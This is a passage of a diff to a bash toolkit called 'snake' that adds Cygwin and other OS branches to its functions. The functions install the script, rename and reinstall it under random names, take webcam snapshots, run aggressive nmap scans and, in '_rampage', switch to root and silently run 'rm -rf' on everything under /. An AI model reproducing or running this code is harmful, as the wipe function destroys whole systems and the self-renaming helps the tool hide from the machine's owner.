+    elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+      printf "$RED Not supported yet$NC\n"
+
     elif [[ $_system == "OS/390" ]]; then
 
-      printf "$RED Not supported yet\n"
+      printf "$RED Not supported yet$NC\n"
 
     else
 
-      printf "$RED Not supported default$NC\n"
+      printf "$RED Not supported sys$NC\n"
 
     fi
 
@@ -3172,48 +4491,68 @@ _exec_i(){ #selfi
 
   _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "Darwin" ]; then #tw
   if [ "$1" == "-g" ]; then
    sudo chmod +x snake
    sudo cp snake /usr/local/bin/
    _ghost
-   printf "$RED _installed$NC \n"
+   printf "$RED _installed$NC \n";
   else
    sudo chmod +x snake
    sudo cp snake /usr/local/bin/
-   printf "$RED _installed$NC \n"
+   printf "$RED _installed$NC \n";
   fi
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
    sudo chmod +x snake
    sudo cp snake /usr/local/bin/
-   printf "$RED _installed$NC \n"
-elif [[ $_system == "GNU" ]]; then
+   printf "$RED _installed$NC \n";
+elif [[ $_system == "GNU" ]]; then #tw
    su
    chmod +x snake
    cp snake /usr/local/bin/
-   printf "$RED _installed$NC \n"
-elif [[ $_system == "Haiku" ]]; then
+   printf "$RED _installed$NC \n";
+elif [[ $_system == "Haiku" ]]; then #tw
    chmod +x snake
    cp snake /bin
-   printf "$RED _installed$NC \n"
-elif [[ $_system == "Minix" ]]; then
+   printf "$RED _installed$NC \n";
+elif [[ $_system == "Minix" ]]; then #nn
    chmod +x snake
    cp snake /usr/local/bin/
-   printf "$RED _installed$NC \n"
-elif [[ $_system == "OpenBSD" ]]; then
+   printf "$RED _installed$NC \n";
+elif [[ $_system == "OpenBSD" ]]; then #nn
    chmod +x snake
    cp snake /usr/local/bin/
-   printf "$RED _installed$NC \n"
- elif [[ $_system == "SunOS" ]]; then
+   printf "$RED _installed$NC \n";
+ elif [[ $_system == "SunOS" ]]; then #nn
    chmod +x snake
    cp snake /usr/local/bin/
-   printf "$RED _installed$NC \n"
-elif [[ $_system == "OS/390" ]]; then
+   printf "$RED _installed$NC \n";
+ elif [[ $_system == "CYGWIN_NT-5.0" ]]; then #nn
    chmod +x snake
    cp snake /usr/local/bin/
-   printf "$RED _installed$NC \n"
+   printf "$RED _installed$NC \n";
+ elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
+   chmod +x snake
+   cp snake /usr/local/bin/
+   printf "$RED _installed$NC \n";
+ elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn
+   chmod +x snake
+   cp snake /usr/local/bin/
+   printf "$RED _installed$NC \n";
+ elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
+   chmod +x snake
+   cp snake /usr/local/bin/
+   printf "$RED _installed$NC \n";
+ elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
+   chmod +x snake
+   cp snake /usr/local/bin/
+   printf "$RED _installed$NC \n";
+elif [[ $_system == "OS/390" ]]; then #nn
+   chmod +x snake
+   cp snake /usr/local/bin/
+   printf "$RED _installed$NC \n";
 else
-   printf "$RED Not supported default$NC\n"
+   printf "$RED Not supported sys$NC\n";
 fi
 
 
@@ -3269,12 +4608,32 @@ elif [[ $_system == "SunOS" ]]; then
    chmod +x snake
    cp snake /usr/local/bin/
 
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+    chmod +x snake
+    cp snake /usr/local/bin/
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+    chmod +x snake
+    cp snake /usr/local/bin/
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+    chmod +x snake
+    cp snake /usr/local/bin/
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+    chmod +x snake
+    cp snake /usr/local/bin/
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+    chmod +x snake
+    cp snake /usr/local/bin/
+
 elif [[ $_system == "OS/390" ]]; then
    chmod +x snake
    cp snake /usr/local/bin/
 
 else
-   printf "$RED Not supported default$NC\n"
+   printf "$RED Not supported sys$NC\n"
 fi
 
 
@@ -3313,11 +4672,26 @@ elif [[ $_system == "OpenBSD" ]]; then
 elif [[ $_system == "SunOS" ]]; then
    sudo chmod -x snake
    sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+   sudo chmod -x snake
+   sudo rm -rf /usr/local/bin/snake
 elif [[ $_system == "OS/390" ]]; then
    sudo chmod -x snake
    sudo rm -rf /usr/local/bin/snake
 else
-   printf "$RED Not supported default$NC\n"
+   printf "$RED Not supported sys$NC\n"
 fi
 
 
@@ -3489,7 +4863,15 @@ _snap(){ #selfs
 
              printf "$RED Not supported yet$NC\n"
 
+           elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+             printf "$RED Not supported yet$NC\n"
+
            elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+             printf "$RED Not supported yet$NC\n"
+
+           elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
 
              printf "$RED Not supported yet$NC\n"
 
@@ -3507,7 +4889,7 @@ _snap(){ #selfs
 
            else
 
-             printf "$RED Not supported default$NC\n"
+             printf "$RED Not supported sys$NC\n"
 
            fi
 
@@ -3672,7 +5054,15 @@ _decompose(){ #selfs
 
           printf "$RED Not supported yet$NC\n"
 
+        elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+          printf "$RED Not supported yet$NC\n"
+
         elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+          printf "$RED Not supported yet$NC\n"
+
+        elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
 
           printf "$RED Not supported yet$NC\n"
 
@@ -3690,7 +5080,7 @@ _decompose(){ #selfs
 
         else
 
-          printf "$RED Not supported default$NC\n"
+          printf "$RED Not supported sys$NC\n"
 
         fi
 
@@ -3721,35 +5111,128 @@ _r_w(){ #selfc
 elif [[ $_system == "Linux" ]]; then
 
 
-  _converted=$( echo $1 | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
-  _revved=$( echo $1 | rev)
+  _new="$(echo $1 | rev )"
 
+  mkdir blana ; cd blana
   sudo cp /usr/local/bin/snake ./snake
-  sudo cp snake snake2
-  sh snake -uninstall
-  sudo rm -rf snake
-  cat snake2 | sed "s/snake/$1/g" | sed "s/S.N.A.K.E/$_converted/g" > $1
-  sudo rm -rf snake2 ; printf "$_revved\n" ; printf "Check if name changed exists\n"
-  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "GNU" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  su
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
 
 elif [[ $_system == "Haiku" ]]; then
 
-  _rnd=$[RANDOM%50]
-  _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
+  _new="$(echo $1 | rev )"
 
-  _converted=$( echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
-  _revved=$( echo ${_names[$_rnd]} | rev)
-
+  mkdir blana ; cd blana
   cp /usr/local/bin/snake ./snake
-  cp snake snake2
-  sh snake -uninstall
-  rm -rf snake
-  cat snake2 | sed "s/snake/${_names[$_rnd]}/g" | sed "s/S.N.A.K.E/$_converted/g" > ${_names[$_rnd]}
-  rm -rf snake2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; rm -rf ${_names[$_rnd]}
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "HP-UX" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "SunOS" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
+
+elif [[ $_system == "OS/390" ]]; then
+
+  _new="$(echo $1 | rev )"
+
+  mkdir blana ; cd blana
+  cp /usr/local/bin/snake ./snake
+  cat snake | sed "s/magic/$_new/g" > snake2
+  sudo rm -rf snake ; sudo mv snake2 snake ; sh snake -qinstall ; sudo rm -rf snake
+  cd .. ; sudo rm -rf blana
 
 else
 
-  printf "$RED Not supported default$NC\n"
+  printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -3897,6 +5380,71 @@ elif [[ $_system == "SunOS" ]]; then
  cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
  sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
 
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp /usr/local/bin/snake ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp /usr/local/bin/snake ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp /usr/local/bin/snake ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp /usr/local/bin/snake ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp /usr/local/bin/snake ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
 
 elif [[ $_system == "OS/390" ]]; then
 
@@ -3914,7 +5462,7 @@ elif [[ $_system == "OS/390" ]]; then
 
 else
 
-  printf "$RED Not supported default$NC\n"
+  printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -4007,6 +5555,26 @@ _melt(){ #selfc
 
     printf "$RED Not supported yet$NC\n"
 
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
   elif [[ $_system == "OS/390" ]]; then
 
     printf "$RED Not supported yet$NC\n"
@@ -4015,7 +5583,7 @@ _melt(){ #selfc
 
   else
 
-    printf "$RED Not supported default$NC\n"
+    printf "$RED Not supported sys$NC\n"
 
   fi
 
@@ -4138,6 +5706,72 @@ _replicate(){ #selfc
            cat snake2 | sed "s/snake/${_names[$_rnd]}/g" | sed "s/S.N.A.K.E/$_converted/g" > ${_names[$_rnd]}
            sudo rm -rf snake2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
 
+         elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+           _rnd=$[RANDOM%50]
+           _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
+
+           _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+           _revved=$(echo ${_names[$_rnd]} | rev)
+
+            sudo cp /usr/local/bin/snake ./snake
+            sudo cp snake snake2
+            cat snake2 | sed "s/snake/${_names[$_rnd]}/g" | sed "s/S.N.A.K.E/$_converted/g" > ${_names[$_rnd]}
+            sudo rm -rf snake2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
+       elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+            _rnd=$[RANDOM%50]
+            _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
+
+            _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+            _revved=$(echo ${_names[$_rnd]} | rev)
+
+             sudo cp /usr/local/bin/snake ./snake
+             sudo cp snake snake2
+             cat snake2 | sed "s/snake/${_names[$_rnd]}/g" | sed "s/S.N.A.K.E/$_converted/g" > ${_names[$_rnd]}
+             sudo rm -rf snake2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
+        elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+             _rnd=$[RANDOM%50]
+             _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
+
+             _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+             _revved=$(echo ${_names[$_rnd]} | rev)
+
+              sudo cp /usr/local/bin/snake ./snake
+              sudo cp snake snake2
+              cat snake2 | sed "s/snake/${_names[$_rnd]}/g" | sed "s/S.N.A.K.E/$_converted/g" > ${_names[$_rnd]}
+              sudo rm -rf snake2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
+
+      elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+              _rnd=$[RANDOM%50]
+              _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
+
+              _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+              _revved=$(echo ${_names[$_rnd]} | rev)
+
+               sudo cp /usr/local/bin/snake ./snake
+               sudo cp snake snake2
+               cat snake2 | sed "s/snake/${_names[$_rnd]}/g" | sed "s/S.N.A.K.E/$_converted/g" > ${_names[$_rnd]}
+               sudo rm -rf snake2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
+     elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+               _rnd=$[RANDOM%50]
+               _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
+
+               _converted=$(echo ${_names[$_rnd]} | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+               _revved=$(echo ${_names[$_rnd]} | rev)
+
+                sudo cp /usr/local/bin/snake ./snake
+                sudo cp snake snake2
+                cat snake2 | sed "s/snake/${_names[$_rnd]}/g" | sed "s/S.N.A.K.E/$_converted/g" > ${_names[$_rnd]}
+                sudo rm -rf snake2 ; printf "$_revved\n" ; sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
        elif [[ $_system == "OS/390" ]]; then
 
          _rnd=$[RANDOM%50]
@@ -4155,7 +5789,7 @@ _replicate(){ #selfc
 
     else
 
-       printf "$RED Not supported default$NC\n"
+       printf "$RED Not supported sys$NC\n"
 
     fi
 
@@ -4293,6 +5927,46 @@ _radar(){ #selfe
          date
          printf "$NC"
 
+       elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
        elif [[ $_system == "OS/390" ]]; then
 
          speedtest-cli | grep -E 'Download|Upload'
@@ -4397,6 +6071,13 @@ _rampage(){ #selfd
     bash -c 'rm -rf  ./*' >/dev/null 2>&1
     bash -c 'rm -rf ./.*' >/dev/null 2>&1
 
+  elif [[ $_system == "HP-UX" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
 
   elif [[ $_system == "Minix" ]]; then
 
@@ -4412,10 +6093,59 @@ _rampage(){ #selfd
     bash -c 'rm -rf  ./*' >/dev/null 2>&1
     bash -c 'rm -rf ./.*' >/dev/null 2>&1
 
+  elif [[ $_system == "SunOS" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    su
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
 
   else
 
-    printf "$RED Not supported default$NC\n"
+    printf "$RED Not supported sys$NC\n"
 
   fi
 
@@ -4425,7 +6155,7 @@ _rampage(){ #selfd
 
 _maid() { #selft
 
-if [ $1 == "-e" ]; then
+if [ $1 == "-l" ]; then
 
     while true; do
         read -ep 'Security Service, agent here, should I lock? [d/N] ' response
@@ -4441,7 +6171,7 @@ if [ $1 == "-e" ]; then
     done
     echo 'Locking done - Agent Signing Out'
 
-  elif [[ $1 == "-d" ]]; then
+  elif [[ $1 == "-u" ]]; then
 
     while true; do
         read -ep 'Security Service, agent here, should I unlock? [d/N] ' response
@@ -4480,7 +6210,24 @@ if [ $1 == "-e" ]; then
 _osf(){
 
 
-    printf "$RED Not supported yet$NC\n"
+
+
+    cd /
+    _devn="$(ls | grep -c dev)"
+    _etcn="$(ls | grep -c etc)"
+    _homn="$(ls | grep -c home)"
+    _usrn="$(ls | grep -c usr)"
+    _varn="$(ls | grep -c var)"
+    _binn="$(ls | grep -c bin)"
+    _sbnn="$(ls | grep -c sbin)"
+    _tmpn="$(ls | grep -c tmp)"
+    _envn="$(ls | grep -c env)"
+
+    if [ $_envn == "1" ]; then
+      printf "This should be Plan 9\n"
+    else
+      printf "OS Unknown\n"
+    fi
 
 }
 
@@ -4527,13 +6274,16 @@ _ports(){ #selft
 
 _cheese(){ #selft
 
+
+
+
   _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then   #tw
 
     imagesnap -w 1 -q >/dev/null
 
-  elif [[ $_system == "Linux" ]]; then
+  elif [[ $_system == "Linux" ]]; then  #nn
 
     fswebcam -r 640x480 --jpeg 85 -D 1 snapshot.jpg >/dev/null
 
@@ -4576,11 +6326,11 @@ _wisconsin(){ #selft
 
     _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then  #tw
 
     imagesnap -w 1 -q .snapshot.png >/dev/null
 
-  elif [[ $_system == "Linux" ]]; then
+  elif [[ $_system == "Linux" ]]; then  #nn
 
     fswebcam -r 640x480 --jpeg 85 -D 1 snapshot.jpg >/dev/null
 
@@ -4619,55 +6369,121 @@ _wisconsin(){ #selft
   fi
 }
 
+_wit2(){ #selft
+
+     if [ "$2" == "i" ]; then
+
+     sudo nmap -O --osscan-guess -Pn -vv  $1
+
+     else
+
+     sudo nmap -O --osscan-guess -Pn -vv  $1
+
+     fi
+
+}
 
 
 _wit(){ #selft
 
-     sudo nmap -O --osscan-guess -Pn -vv  $1
+     if [ "$2" == "i" ]; then
+
+     sudo nmap -O --osscan-guess -Pn $1
+
+     else
+
+     sudo nmap -O --osscan-guess -Pn $1
+
+     fi
 
 }
 
 _wit6(){ #selft
 
+   if [ $2 == "i" ]; then
+
      sudo nmap -O --osscan-guess -Pn -vv -6  $1
+
+   else
+
+     sudo nmap -O --osscan-guess -Pn -vv -6  $1
+
+   fi
 
 }
 
 _wth(){ #selft
 
-     sudo nmap -O --osscan-guess -Pn -sSU -vv $1
+
+
+     if [ $2 == "i" ]; then
+        sudo nmap -O --osscan-guess -Pn -sSU -vv $1
+     else
+        sudo nmap -O --osscan-guess -Pn -sSU -vv $1
+     fi
 
 }
 
 _wth6(){ #selft
 
-     sudo nmap -O --osscan-guess -Pn -sSU -6 -vv $1
+
+
+     if [ $2 == "i" ]; then
+        sudo nmap -O --osscan-guess -Pn -sSU -6 -vv $1
+     else
+        sudo nmap -O --osscan-guess -Pn -sSU -6 -vv $1
+     fi
 
 }
 
 
 _col(){ #selft
 
-    sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O --osscan-guess $1
+
+
+    if [ $2 == "i" ]; then
+       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O --osscan-guess $1
+    else
+       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O --osscan-guess $1
+    fi
 
 }
 
 _col6(){ #selft
 
-    sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O -6 --osscan-guess $1
+
+
+    if [ $2 == "i" ]; then
+       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O -6 --osscan-guess $1
+    else
+       sudo nmap -T4 -n -A -Pn -vv -p1-65535 -O -6 --osscan-guess $1
+    fi
 
 }
 
 _wtf(){ #selft
 
-    sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -sV -sSU $1
+
+
+
+    if [ $2 == "i" ]; then
